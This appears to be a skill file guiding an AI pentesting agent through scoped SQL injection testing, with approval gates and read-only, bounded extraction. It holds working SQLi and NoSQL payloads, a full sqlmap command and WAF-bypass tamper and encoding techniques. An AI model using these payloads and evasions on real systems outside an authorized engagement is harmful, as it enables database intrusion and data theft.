---
name: harness-sqli
description: "Test error-based, blind boolean, blind time-based, UNION, stacked and second-order SQL injection with sqlmap and manual probes. One parameter per attempt, differential confirmation."
---

# SQLi deep — differential, one-param, bounded extraction

Source: `testing-for-sql-injection`, `sqlmap-usage`, `blind-sqli-techniques` (2024: JSON/GraphQL injection points, WAF bypass with inline comments, NoSQL operator injection).

## Gate

Approved `host+endpoint+parameter` only. Every command via `cyber_process` `argv`. One parameter per test. Extraction stops at proof (database name + version + one table name). No `DROP`, `DELETE`, `UPDATE`, `INSERT` — read-only probes. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Parameter and context identification

Map all input vectors on the endpoint:
- URL query parameters (`?id=1`)
- POST body (form, JSON, XML, multipart)
- HTTP headers (Cookie values, Referer, X-Forwarded-For, custom headers)
- Path segments (`/api/user/1`)
- GraphQL variables and directives

For each, record the expected type (integer, string, date, boolean, array, JSON object).

### 2. Error-based detection (fastest signal)

Inject type-breaking values and observe:
```
Original: id=1        → 200, normal response (baseline)
Probe 1:  id=1'       → 500/error/different response = string context
Probe 2:  id=1"       → same check for double-quote context
Probe 3:  id=1\       → backslash escape check
Probe 4:  id=1)       → parenthesis context
Probe 5:  id=1' OR '1'='1  → true condition, compare with baseline
Probe 6:  id=1' OR '1'='2  → false condition, must differ from probe 5
```

**Differential test**: probe 5 (true) and probe 6 (false) MUST produce different responses. Same response = not injectable. Record each as an observation.

### 3. Blind boolean detection

When error-based shows no visible error but differential exists:
```
True:  id=1 AND 1=1   → normal response
False: id=1 AND 1=2   → different response (empty, fewer rows, different length)
```

Measure: response length, word count, specific content presence. Use `diff-control.py --seuil-ms` for timing if responses are identical in content.

### 4. Blind time-based detection

When boolean blind is inconclusive:
```
Baseline:  id=1                          → measure response time (3 samples, median)
Payload:   id=1; WAITFOR DELAY '0:0:5'  → MSSQL
           id=1' AND SLEEP(5)-- -        → MySQL
           id=1'; SELECT pg_sleep(5)-- - → PostgreSQL
           id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -  → MySQL subquery
```

Confirmation: 3 consecutive runs with consistent delay > 4 seconds above baseline median. One sample is never proof.

### 5. UNION-based extraction (after injection confirmed)

1. Determine column count:
   ```
   id=1 ORDER BY 1-- -     → OK
   id=1 ORDER BY 2-- -     → OK
   ...
   id=1 ORDER BY N+1-- -   → error → N columns
   ```

2. Find displayable column:
   ```
   id=-1 UNION SELECT 1,2,...,N-- -  → which number appears in response
   ```

3. Extract proof (stop here — bounded extraction):
   ```
   id=-1 UNION SELECT 1,@@version,3,...,N-- -          → MySQL version
   id=-1 UNION SELECT 1,version(),3,...,N-- -           → PostgreSQL version
   id=-1 UNION SELECT 1,@@servername,3,...,N-- -        → MSSQL hostname
   id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables LIMIT 1-- -
   ```

### 6. sqlmap automation (after manual confirmation)

Only after manual confirmation of injection:
```bash
sqlmap -u "https://target/endpoint?id=1" \
  --batch --risk=1 --level=3 \
  --technique=BEUST \
  --dbms=<detected> \
  --threads=1 \
  --tamper=<if-waf> \
  --banner --current-db --current-user \
  --tables --stop 1 \
  --output-dir=<evidence-dir>/sqlmap
```

Tamper scripts by WAF:
| WAF | Tamper |
|---|---|
| Cloudflare | `between,randomcase,space2comment` |
| Akamai | `charencode,greatest,between` |
| AWS WAF | `space2mssqlblank,randomcase` |
| ModSecurity | `modsecurityversioned,space2comment,between` |
| Generic | `space2comment,randomcase,between,equaltolike` |

Record the sqlmap output directory as an observation.

### 7. Special injection contexts

**JSON injection:**
```json
{"id": "1' OR '1'='1", "name": "test"}
```

**GraphQL injection:**
```graphql
query { user(id: "1' OR '1'='1") { name } }
```

**NoSQL (MongoDB):**
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
```

**Second-order:** inject in registration/profile → check in admin panel/export/email. Store the injection point observation, then the trigger observation separately.

**Header injection:**
```
X-Forwarded-For: 1' OR '1'='1
Cookie: session=x; lang=en' AND SLEEP(5)-- -
Referer: https://target/' OR '1'='1
```

### 8. Negative controls

For each confirmed injection:
- Control 1: original value → normal response = positive control.
- Control 2: safe string with no SQL meaning (e.g., `id=AAAA`) → no SQL behavior = negative.
- Control 3: same payload on a parameter known to not be injectable → no effect.
- Control 4: for time-based, same query with `SLEEP(0)` → no delay.

### 9. Evidence assembly

`cyber_finding` with:
- `evidence`: baseline + error probes + true/false differential + extraction proof + sqlmap output + all negative controls
- `sources`: the response diff showing the differential behavior
- `checks`: baseline:positive-control, true-condition:reproduction, false-condition:negative-control, safe-string:negative-control
- `impact`: database type + version + current user + privilege level (DBA? file read? OS command?)

### WAF bypass protocol

If payloads are blocked:
1. Identify WAF via response headers and `wafw00f`.
2. Encoding: URL double-encode, Unicode (`%u0027`), hex (`0x27`).
3. Comments: `/*!50000 UNION*/`, `/**/`, `--+-`.
4. Case: `uNiOn SeLeCt`, `UnIoN%0a%0dSeLeCt`.
5. Functions: `CONCAT(0x,…)` instead of strings, `CHAR()` instead of quotes.
6. HTTP: different methods (GET→POST), `Content-Type` switch, chunked encoding.

## Proof contract

A finding needs: (1) identified injectable parameter and context, (2) differential proof (true vs false), (3) extracted proof data (version/table), (4) reproduction, (5) four negative controls. A `500` error alone is a lead, not a finding. Time-based needs 3 consistent samples.

## Done

Each SQLi cites the parameter, context, differential proof, extraction depth, and all negative controls. `sqlmap --batch` output alone is not proof without the manual differential.
